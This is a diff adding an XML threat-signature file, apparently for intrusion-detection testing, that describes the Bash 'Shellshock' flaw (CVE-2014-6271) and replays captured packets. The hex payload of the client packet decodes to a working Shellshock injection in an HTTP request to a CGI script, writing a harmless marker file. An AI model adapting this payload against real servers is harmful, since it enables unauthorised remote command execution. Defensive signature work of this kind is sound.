@@ -1,0 +1,97 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="GNU Bash Environment Variable Handling Command Execution"/>
+    <EngDesc display="true" value="A command execution vulnerability exists in GNU Bash. The vulnerability is due to a failure in handling environment variables. A remote attacker can exploit this vulnerability by interacting with an application that uses Bash environment variables. If an attacker can control the value of an environment variable, then command execution can be achieved in the context of the application using the environment variable."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="HTTP/HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="GNU"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Bash"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="3.0/3.1/3.2/4.0/4.1/4.2/4.3"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140924-07"/>
+    <CVEID display="true" value="CVE-2014-6271"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="112004"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="371f8ecd5374854bef892ac1057b52a9"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="PARTIAL"/>
+    <IntegImpact display="false" value="PARTIAL"/>
+    <AvailImpact display="false" value="PARTIAL"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635496720587682132"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="E"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="B">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+    <for index="C">
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:4F:F5" destMac="00:50:56:B4:37:F8" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0093" Identification="83BA" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="4D23" srcIP="172.16.8.209" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="50891" destPort="$HTTPdestPort" SeqNumber="DB120F53" AckNumber="BD87DC64" HeaderLength="08" WindowSize="001D" Checksum="BBB1" UrgentPointer="0000" Options="0101080A041B8CEB00481D4C" Payload="474554202F6367692D62696E2F74736C2D74657374202829207B2074736C3B7D3B206563686F202754454C5553205365637572697479204C61627327203E202F746D702F54534C0D0A486F73743A203137322E31362E382E3135300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:37:F8" destMac="00:50:56:B4:4F:F5" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00E3" Identification="C12A" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="0F63" srcIP="$destIP" destIP="172.16.8.209" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="50891" SeqNumber="BD87DC64" AckNumber="DB120FB2" HeaderLength="08" WindowSize="0389" Checksum="AD12" UrgentPointer="0000" Options="0101080A00481D4F041B8CEB" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C2032352053657020323031342031393A33373A313620474D540D0A5365727665723A204170616368652F322E322E323220285562756E7475290D0A566172793A204163636570742D456E636F64696E670D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A0D0A54454C5553205365637572697479204C6162730A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="C" Count="">
+      <Ethernet srcMac="00:50:56:B4:37:F8" destMac="00:50:56:B4:4F:F5" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="C12B" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="1011" srcIP="$destIP" destIP="172.16.8.209" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="50891" SeqNumber="BD87DD13" AckNumber="DB120FB2" HeaderLength="08" WindowSize="0389" Checksum="0E92" UrgentPointer="0000" Options="0101080A00481D4F041B8CEB" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="true" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
